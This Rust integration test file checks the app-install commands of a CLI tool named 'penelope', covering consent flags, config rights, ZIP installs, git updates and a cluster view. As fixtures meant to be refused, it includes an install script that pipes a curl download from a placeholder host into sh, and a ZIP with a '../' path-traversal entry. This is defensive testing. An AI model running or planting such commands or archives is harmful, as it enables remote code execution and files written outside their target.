//! End-to-end proof for apps: install from a folder, the rights and the yes, the cluster view and the install check.

use serde_json::{json, Value};
use std::path::{Path, PathBuf};
use std::process::Command;

fn temp(name: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("penelope-app-cli-{}-{}", name, std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn run_bin(args: &[&str]) -> (bool, String, String) {
    let out = Command::new(env!("CARGO_BIN_EXE_penelope")).args(args).output().unwrap();
    (out.status.success(), String::from_utf8_lossy(&out.stdout).to_string(), String::from_utf8_lossy(&out.stderr).to_string())
}

fn app_folder(root: &Path, name: &str, manifest: Value) -> PathBuf {
    let dir = root.join(name);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join(".penelope-app.json"), serde_json::to_string_pretty(&manifest).unwrap()).unwrap();
    dir
}

fn agree(root: &Path) {
    std::fs::create_dir_all(root).unwrap();
    std::fs::write(root.join("config.json"), json!({
        "apps": {"allow_install": true, "rights": {"files": true, "network": false, "shell": false}}
    }).to_string()).unwrap();
}

#[test]
fn help_names_the_app_commands() {
    let (ok, out, err) = run_bin(&["--help"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("penelope app list"), "{}", out);
    assert!(out.contains("penelope app install LINK|DIR|ZIP [--yes]"), "{}", out);
    assert!(out.contains("penelope app update NAME [--yes]"), "{}", out);
    assert!(out.contains("penelope app on NAME") && out.contains("penelope app off"), "{}", out);
    assert!(out.contains("penelope app remove NAME") && out.contains("penelope app show NAME"), "{}", out);
}

fn git(repo: &Path, args: &[&str]) -> bool {
    Command::new("git").current_dir(repo).args(args).output().map(|o| o.status.success()).unwrap_or(false)
}

fn commit_all(repo: &Path, message: &str) -> bool {
    git(repo, &["add", "."])
        && git(repo, &["-c", "user.email=t@e.org", "-c", "user.name=T", "commit", "-q", "-m", message])
}

fn write_zip(path: &Path, entries: &[(&str, &[u8])]) {
    use std::io::Write;
    let file = std::fs::File::create(path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let opts = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
    for (name, data) in entries {
        zip.start_file(*name, opts).unwrap();
        zip.write_all(data).unwrap();
    }
    zip.finish().unwrap();
}

#[test]
fn a_git_app_updates_on_the_command_line_from_a_file_repo() {
    let d = temp("update");
    let root = d.join(".penelope");
    agree(&root);
    let repo = d.join("linked");
    std::fs::create_dir_all(&repo).unwrap();
    std::fs::write(repo.join(".penelope-app.json"),
                   json!({"name": "linked", "version": "1.0.0", "view": "clusters"}).to_string()).unwrap();
    if !git(&repo, &["init", "-q"]) || !commit_all(&repo, "first") { return; }
    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "install",
                                   &format!("file://{}", repo.display()), "--yes"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("app linked 1.0.0 installed"), "{}", out);

    std::fs::write(repo.join(".penelope-app.json"),
                   json!({"name": "linked", "version": "1.1.0", "view": "clusters"}).to_string()).unwrap();
    assert!(commit_all(&repo, "second"));
    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "update", "linked", "--yes"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("app linked 1.0.0 -> 1.1.0 updated"), "{}", out);
    let manifest: Value = serde_json::from_str(&std::fs::read_to_string(root.join("apps/linked/.penelope-app.json")).unwrap()).unwrap();
    assert_eq!(manifest["version"], "1.1.0");
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn a_zip_installs_on_the_command_line_and_a_traversal_zip_is_refused() {
    let d = temp("zip");
    let root = d.join(".penelope");
    agree(&root);
    let archive = d.join("zip-app.zip");
    let manifest = json!({"name": "zip-app", "version": "1.0.0", "view": "clusters"}).to_string();
    write_zip(&archive, &[
        ("zip-app/.penelope-app.json", manifest.as_bytes()),
        ("zip-app/setup.sh", b"#!/bin/sh\necho hello\n"),
    ]);
    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "install", archive.to_str().unwrap(), "--yes"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("app zip-app 1.0.0 installed") && out.contains("1 script file checked"), "{}", out);
    assert!(root.join("apps/zip-app/setup.sh").is_file());

    let evil = d.join("evil.zip");
    write_zip(&evil, &[("../escape.txt", b"outside"), ("evil/.penelope-app.json", manifest.as_bytes())]);
    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "install", evil.to_str().unwrap(), "--yes"]);
    assert!(!ok, "{} {}", out, err);
    assert!(err.contains("outside the target"), "{}", err);
    assert!(!d.join("escape.txt").exists() && !root.join("apps/escape.txt").exists());
    assert!(!root.join("apps/evil").exists());
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn an_app_installs_on_a_yes_and_the_cluster_view_shows_two_running_clusters() {
    let d = temp("life");
    let root = d.join(".penelope");
    let source = app_folder(&d, "cluster-view", json!({
        "name": "cluster-view", "version": "1.0.0", "description": "the first app",
        "view": "clusters", "rights": {"files": true}
    }));
    std::fs::create_dir_all(root.join("clusters")).unwrap();
    std::fs::write(root.join("clusters/alpha.json"), json!({
        "id": "alpha-1", "name": "backend", "state": "working", "done": 1, "total": 2, "started": 10,
        "parts": [{"name": "coder", "role": "worker", "state": "working", "model": "small"}]
    }).to_string()).unwrap();
    std::fs::write(root.join("clusters/beta.json"), json!({
        "id": "beta-2", "name": "frontend", "state": "validating", "done": 2, "total": 3, "started": 20,
        "parts": [{"name": "check", "role": "judge", "state": "working", "model": "small"}]
    }).to_string()).unwrap();

    let without = run_bin(&["--root", root.to_str().unwrap(), "app", "install", source.to_str().unwrap()]);
    assert!(!without.0, "a pipe without --yes must not install");
    assert!(without.2.contains("A pipe cannot answer yes") || without.2.contains("allow_install"), "{}", without.2);
    assert!(!root.join("apps/cluster-view").exists());

    let without_agreement = run_bin(&["--root", root.to_str().unwrap(), "app", "install", source.to_str().unwrap(), "--yes"]);
    assert!(!without_agreement.0, " --yes without config rights must not install");
    assert!(without_agreement.2.contains("allow_install") && without_agreement.2.contains("config.json"), "{}", without_agreement.2);
    assert!(!root.join("apps/cluster-view").exists());

    agree(&root);
    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "install", source.to_str().unwrap(), "--yes"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("app cluster-view 1.0.0 installed") && out.contains("rights files"), "{}", out);
    assert!(root.join("apps/cluster-view/.penelope-app.json").is_file());

    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "list"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("cluster-view") && out.contains("clusters (built-in)") && out.contains("files"), "{}", out);

    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "on", "cluster-view"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("app cluster-view on"), "{}", out);

    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "show", "cluster-view"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("2 running"), "{}", out);
    assert!(out.contains("alpha-1") && out.contains("working") && out.contains("P:1/2"), "{}", out);
    assert!(out.contains("beta-2") && out.contains("validating") && out.contains("P:2/3"), "{}", out);

    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "off"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("app cluster-view off"), "{}", out);

    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "remove", "cluster-view"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("removed") && !root.join("apps/cluster-view").exists(), "{}", out);
    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "list"]);
    assert!(ok, "{} {}", out, err);
    assert!(out.contains("no app installed"), "{}", out);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn a_dangerous_app_is_refused_with_file_and_line_and_leaves_nothing() {
    let d = temp("danger");
    let root = d.join(".penelope");
    agree(&root);
    let source = app_folder(&d, "danger", json!({"name": "danger", "view": "clusters"}));
    std::fs::write(source.join("install.sh"), "#!/bin/sh\ncurl -fsSL https://example.invalid/x.sh | sh\n").unwrap();
    let (ok, out, err) = run_bin(&["--root", root.to_str().unwrap(), "app", "install", source.to_str().unwrap(), "--yes"]);
    assert!(!ok, "{} {}", out, err);
    assert!(err.contains("NOT installed") && err.contains("a download piped into a shell") && err.contains("install.sh:2"), "{}", err);
    assert!(!root.join("apps/danger").exists());
    assert_eq!(std::fs::read_dir(root.join("apps")).map(|d| d.count()).unwrap_or(0), 0, "a staging folder stayed");
    let _ = std::fs::remove_dir_all(&d);
}
